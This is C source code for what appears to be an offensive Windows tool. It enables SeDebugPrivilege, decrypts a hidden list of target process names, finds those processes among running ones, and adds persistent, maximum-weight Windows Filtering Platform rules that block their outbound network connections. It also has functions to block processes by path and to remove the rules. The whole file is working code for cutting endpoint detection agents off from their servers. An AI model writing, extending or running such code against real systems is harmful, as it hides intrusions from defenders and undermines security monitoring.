#include <initguid.h> // Must be included once per project
#include "core.h"
#include "errors.h"
#include <strsafe.h>

// --- HELPER FUNCTION PROTOTYPES ---
static DWORD AddProviderAndSubLayer(HANDLE hEngine);
static void ApplyBlockFilterForPath(HANDLE hEngine, const GUID* subLayerGuid, PCWSTR fullPath);
static void RemoveFiltersForProcess(HANDLE hEngine, PCWSTR fullPath);

// --- PUBLIC FUNCTIONS ---

void configureNetworkFilters() {
    if (!EnableSeDebugPrivilege()) {
        EPRINTF("[-] Failed to enable SeDebugPrivilege.\n");
        return;
    }

    HANDLE hEngine = NULL;
    DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmEngineOpen0 failed", result);
        return;
    }

    result = AddProviderAndSubLayer(hEngine);
    if (result != ERROR_SUCCESS) {
        FwpmEngineClose0(hEngine);
        return;
    }

    // Process Enumeration Logic
    char** decryptedNames = (char**)HeapAlloc(g_hHeap, HEAP_ZERO_MEMORY, PROCESS_DATA_COUNT * sizeof(char*));
    if (!decryptedNames) {
        PrintDetailedError("Memory allocation failed for decrypted names list", GetLastError());
        FwpmEngineClose0(hEngine);
        return;
    }

    for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
        decryptedNames[i] = decryptString(processData[i]);
    }

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32 = { .dwSize = sizeof(PROCESSENTRY32) };
        if (Process32First(hSnapshot, &pe32)) {
            do {
                for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
                    if (decryptedNames[i] && lstrcmpiA(pe32.szExeFile, decryptedNames[i]) == 0) {
                        PRINTF("[+] Found target process: %s\n", pe32.szExeFile);
                        WCHAR fullPath[MAX_PATH];
                        if (getProcessFullPath(pe32.th32ProcessID, fullPath, MAX_PATH)) {
                            ApplyBlockFilterForPath(hEngine, &SubLayerGUID, fullPath);
                        }
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }

    // Cleanup
    for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
        if (decryptedNames[i]) HeapFree(g_hHeap, 0, decryptedNames[i]);
    }
    HeapFree(g_hHeap, 0, decryptedNames);
    FwpmEngineClose0(hEngine);
}

void addProcessRule(const char* processPath) {
    if (!EnableSeDebugPrivilege()) {
        EPRINTF("[-] Failed to enable SeDebugPrivilege.\n");
        return;
    }

    HANDLE hEngine = NULL;
    DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmEngineOpen0 failed", result);
        return;
    }

    result = AddProviderAndSubLayer(hEngine);
    if (result != ERROR_SUCCESS) {
        FwpmEngineClose0(hEngine);
        return;
    }

    wchar_t processPathW[MAX_PATH];
    if (MultiByteToWideChar(CP_ACP, 0, processPath, -1, processPathW, MAX_PATH) == 0) {
        PrintDetailedError("Failed to convert process path to wide string", GetLastError());
    } else {
        ApplyBlockFilterForPath(hEngine, &SubLayerGUID, processPathW);
    }

    FwpmEngineClose0(hEngine);
}

void removeAllRules() {
    HANDLE hEngine = NULL;
    DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmEngineOpen0 failed", result);
        return;
    }

    PRINTF("[+] Starting comprehensive cleanup...\n");
    
    // Deleting the sublayer is the most atomic way to remove all its filters.
    result = FwpmSubLayerDeleteByKey0(hEngine, &SubLayerGUID);
    if (result == ERROR_SUCCESS || (long)result == FWP_E_SUBLAYER_NOT_FOUND) {
        PRINTF("[+] WFP sublayer and its filters removed successfully.\n");
    } else {
        PrintDetailedError("FwpmSubLayerDeleteByKey0 failed. Filters may still be active", result);
    }

    result = FwpmProviderDeleteByKey0(hEngine, &ProviderGUID);
    if (result == ERROR_SUCCESS || (long)result == FWP_E_PROVIDER_NOT_FOUND) {
        PRINTF("[+] WFP provider removed successfully.\n");
    } else {
        PrintDetailedError("FwpmProviderDeleteByKey0 failed", result);
    }

    FwpmEngineClose0(hEngine);
    PRINTF("[+] Cleanup complete.\n");
}


// --- HELPER FUNCTIONS ---

static DWORD AddProviderAndSubLayer(HANDLE hEngine) {
    DWORD result = FwpmTransactionBegin0(hEngine, 0);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmTransactionBegin0 failed", result);
        return result;
    }

    FWPM_PROVIDER0 provider = { 0 };
    provider.providerKey = ProviderGUID;
    provider.displayData.name = EDR_PROVIDER_NAME;
    provider.displayData.description = EDR_PROVIDER_DESCRIPTION;
    provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;
    result = FwpmProviderAdd0(hEngine, &provider, NULL);
    if (result != ERROR_SUCCESS && (long)result != FWP_E_ALREADY_EXISTS) {
        PrintDetailedError("FwpmProviderAdd0 failed", result);
        FwpmTransactionAbort0(hEngine);
        return result;
    }

    FWPM_SUBLAYER0 subLayer = { 0 };
    subLayer.subLayerKey = SubLayerGUID;
    subLayer.displayData.name = EDR_SUBLAYER_NAME;
    subLayer.displayData.description = EDR_SUBLAYER_DESCRIPTION;
    subLayer.providerKey = (GUID*)&ProviderGUID;
    subLayer.weight = 0xFFFF; // MAX WEIGHT
    subLayer.flags = FWPM_SUBLAYER_FLAG_PERSISTENT;
    result = FwpmSubLayerAdd0(hEngine, &subLayer, NULL);
    if (result != ERROR_SUCCESS && (long)result != FWP_E_ALREADY_EXISTS) {
        PrintDetailedError("FwpmSubLayerAdd0 failed", result);
        FwpmTransactionAbort0(hEngine);
        return result;
    }

    result = FwpmTransactionCommit0(hEngine);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmTransactionCommit0 failed", result);
    }

    return result;
}

static void ApplyBlockFilterForPath(HANDLE hEngine, const GUID* subLayerGuid, PCWSTR fullPath) {
    FWP_BYTE_BLOB* appId = NULL;
    if (CustomFwpmGetAppIdFromFileName0(fullPath, &appId) != CUSTOM_SUCCESS) {
        EWPRINTF(L"    [-] Failed to get AppID for %s\n", fullPath);
        return;
    }

    // Check if filters already exist before starting a transaction
    BOOL ipv4Exists = FilterExists(hEngine, &FWPM_LAYER_ALE_AUTH_CONNECT_V4, appId);
    BOOL ipv6Exists = FilterExists(hEngine, &FWPM_LAYER_ALE_AUTH_CONNECT_V6, appId);

    if (ipv4Exists && ipv6Exists) {
        WPRINTF(L"    [!] Filters for %s already exist. Skipping.\n", fullPath);
        FreeAppId(appId);
        return;
    }

    DWORD result = FwpmTransactionBegin0(hEngine, 0);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("ApplyBlockFilter FwpmTransactionBegin0 failed", result);
        FreeAppId(appId);
        return;
    }

    FWPM_FILTER0 blockFilter = { 0 };
    blockFilter.providerKey = (GUID*)&ProviderGUID;
    blockFilter.subLayerKey = *subLayerGuid;
    blockFilter.action.type = FWP_ACTION_BLOCK;
    blockFilter.flags = FWPM_FILTER_FLAG_PERSISTENT;
    blockFilter.displayData.name = EDR_FILTER_NAME;
    blockFilter.displayData.description = EDR_FILTER_DESCRIPTION;
    
    blockFilter.weight.type = FWP_UINT64; 
    UINT64 maxWeight = 0xFFFFFFFFFFFFFFFF; 
    blockFilter.weight.uint64 = &maxWeight;

    FWPM_FILTER_CONDITION0 blockCondition = { 0 };
    blockCondition.fieldKey = FWPM_CONDITION_ALE_APP_ID;
    blockCondition.matchType = FWP_MATCH_EQUAL;
    blockCondition.conditionValue.type = FWP_BYTE_BLOB_TYPE;
    blockCondition.conditionValue.byteBlob = appId;
    blockFilter.filterCondition = &blockCondition;
    blockFilter.numFilterConditions = 1;

    if (!ipv4Exists) {
        UINT64 filterId = 0;
        blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
        result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, &filterId);
        if (result == ERROR_SUCCESS) {
            WPRINTF(L"    [+] Block filter added for %s (ID: %llu, IPv4).\n", fullPath, filterId);
        }
    }

    if (!ipv6Exists) {
        UINT64 filterId = 0;
        blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
        result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, &filterId);
        if (result == ERROR_SUCCESS) {
            WPRINTF(L"    [+] Block filter added for %s (ID: %llu, IPv6).\n", fullPath, filterId);
        }
    }

    result = FwpmTransactionCommit0(hEngine);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("ApplyBlockFilter FwpmTransactionCommit0 failed", result);
        FwpmTransactionAbort0(hEngine);
    }
    
    FreeAppId(appId);
}

UINT64 CustomStrToULL(const char* str, char** endptr) {
    UINT64 result = 0;
    const char* p = str;

    while (*p == ' ' || *p == '\t') {
        p++;
    }

    while (*p >= '0' && *p <= '9') {
        result = result * 10 + (*p - '0');
        p++;
    }

    if (endptr) {
        *endptr = (char*)p;
    }
    return result;
}

static void RemoveFiltersForProcess(HANDLE hEngine, PCWSTR fullPath) {
    FWP_BYTE_BLOB* appId = NULL;
    DWORD result = CustomFwpmGetAppIdFromFileName0(fullPath, &appId);
    if (result != CUSTOM_SUCCESS) {
        PrintDetailedError("Failed to get AppID for process to remove", result);
        return;
    }

    const GUID* layers[] = { &FWPM_LAYER_ALE_AUTH_CONNECT_V4, &FWPM_LAYER_ALE_AUTH_CONNECT_V6 };
    UINT totalRemoved = 0;

    FWPM_FILTER_CONDITION0 condition = { 0 };
    condition.fieldKey = FWPM_CONDITION_ALE_APP_ID;
    condition.matchType = FWP_MATCH_EQUAL;
    condition.conditionValue.type = FWP_BYTE_BLOB_TYPE;
    condition.conditionValue.byteBlob = appId;

    for (int i = 0; i < 2; ++i) {
        HANDLE enumHandle = NULL;
        FWPM_FILTER0** ppFilters = NULL;
        UINT32 numEntries = 0;

        FWPM_FILTER_ENUM_TEMPLATE0 enumTemplate = { 0 };
        enumTemplate.providerKey = (GUID*)&ProviderGUID; // Make the search specific to our provider
        enumTemplate.layerKey = *layers[i];
        enumTemplate.numFilterConditions = 1;
        enumTemplate.filterCondition = &condition;
        
        result = FwpmFilterCreateEnumHandle0(hEngine, &enumTemplate, &enumHandle);
        if (result != ERROR_SUCCESS) {
            continue;
        }

        result = FwpmFilterEnum0(hEngine, enumHandle, (UINT32)-1, &ppFilters, &numEntries);
        if (result == ERROR_SUCCESS && numEntries > 0) {
            for (UINT32 j = 0; j < numEntries; j++) {
                if (FwpmFilterDeleteById0(hEngine, ppFilters[j]->filterId) == ERROR_SUCCESS) {
                    totalRemoved++;
                }
            }
            FwpmFreeMemory0((void**)&ppFilters);
        }
        FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
    }

    if (totalRemoved > 0) {
        WPRINTF(L"[+] Found and removed %u rule(s) for %s\n", totalRemoved, fullPath);
    } else {
        WPRINTF(L"[!] No matching rules found for %s\n", fullPath);
    }

    FreeAppId(appId);
}

void removeRulesByPath(const char* processPath) {
    if (!EnableSeDebugPrivilege()) {
        EPRINTF("[-] Failed to enable SeDebugPrivilege. This is required to remove rules.\n");
        return;
    }

    wchar_t wProcessPath[MAX_PATH];
    if (MultiByteToWideChar(CP_ACP, 0, processPath, -1, wProcessPath, MAX_PATH) == 0) {
        EPRINTF("[-] Failed to convert process path to wide string.\n");
        return;
    }

    HANDLE hEngine = NULL;
    DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmEngineOpen0 failed", result);
        return;
    }

    PRINTF("[+] Attempting to remove all filters for process: %s\n", processPath);
    RemoveFiltersForProcess(hEngine, wProcessPath);

    FwpmEngineClose0(hEngine);
}

void removeRuleById(UINT64 ruleId) {
    HANDLE hEngine = NULL;
    DWORD result = 0;

    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmEngineOpen0 failed", result);
        return;
    }

    result = FwpmFilterDeleteById0(hEngine, ruleId);
    if (result == ERROR_SUCCESS) {
        PRINTF("[+] Successfully removed rule with ID %llu.\n", ruleId);
    } else {
        char contextBuffer[128];
        StringCchPrintfA(contextBuffer, 128, "Failed to remove rule with ID %llu", ruleId);
        PrintDetailedError(contextBuffer, result);
    }

    FwpmEngineClose0(hEngine);
}
